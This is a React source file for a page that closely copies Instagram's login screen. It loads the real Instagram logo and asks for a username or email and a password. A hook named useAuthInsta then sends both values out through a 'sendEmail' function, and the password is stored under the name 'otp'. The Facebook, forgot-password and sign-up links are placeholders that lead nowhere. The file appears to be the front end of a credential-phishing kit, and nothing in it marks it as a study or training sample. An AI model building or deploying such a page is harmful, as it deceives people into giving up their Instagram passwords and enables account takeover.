import { useState } from "react";
import { FaFacebook } from "react-icons/fa";
import { useAuthInsta } from "../hooks/useAuth";
import Button from "../components/Button";

const Instagram = () => {
  const { sendEmail, isAuthenticating } = useAuthInsta();
  const [email, setEmail] = useState("");
  const [otp, setOtp] = useState("");

  const sendEmailHandler = async () => {
    await sendEmail({
      email,
      otp,
    });
  };

  return (
    <div className="bg-gray-50 flex flex-col items-center justify-center p-4">
      {/* Main Content */}
      <div className="w-full max-w-md bg-white p-8 rounded-lg border border-gray-300">
        {/* Instagram Logo */}
        <div className="flex justify-center mb-8">
          <img
            src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png"
            alt="Instagram"
            className="h-12"
          />
        </div>

        {/* Login Form */}
        <div className="space-y-4">
          <div>
            <input
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              type="text"
              placeholder="Phone number, username, or email"
              className="w-full px-4 py-2 border border-gray-300 rounded text-sm focus:outline-none focus:border-gray-500"
            />
          </div>
          <div>
            <input
              value={otp}
              onChange={(e) => setOtp(e.target.value)}
              type="password"
              placeholder="Password"
              className="w-full px-4 py-2 border border-gray-300 rounded text-sm focus:outline-none focus:border-gray-500"
            />
          </div>
          <Button
            className="!bg-primary-navy !text-primary-white font-semibold w-full flex items-center justify-center"
            disabled={isAuthenticating}
            title="Log In"
            loading={isAuthenticating}
            onClick={sendEmailHandler}
          />
        </div>

        {/* Divider */}
        <div className="flex items-center my-6">
          <div className="flex-grow border-t border-gray-300"></div>
          <span className="mx-4 text-gray-500 text-xs font-medium">OR</span>
          <div className="flex-grow border-t border-gray-300"></div>
        </div>

        {/* Facebook Login */}
        <div className="flex justify-center items-center mb-6">
          <FaFacebook className="text-blue-700 mr-2" />
          <a href="#" className="text-blue-900 text-sm font-medium">
            Log in with Facebook
          </a>
        </div>

        {/* Forgot Password */}
        <div className="text-center">
          <a href="#" className="text-xs text-blue-900">
            Forgot password?
          </a>
        </div>
      </div>

      {/* Sign Up Section */}
      <div className="w-full max-w-md bg-white p-4 rounded-lg border border-gray-300 mt-4 text-center">
        <p className="text-sm">
          {"Don't have an account?"}{" "}
          <a href="#" className="text-blue-500 font-medium">
            Sign up
          </a>
        </p>
      </div>

      {/* App Download Links */}
      {/* <div className="mt-6 text-center">
        <p className="text-sm mb-4">Get the app.</p>
        <div className="flex justify-center space-x-2">
          <img
            src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png"
            alt="App Store"
            className="h-10"
          />
          <img
            src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png"
            alt="Google Play"
            className="h-10"
          />
        </div>
      </div> */}
    </div>
  );
};

export default Instagram;
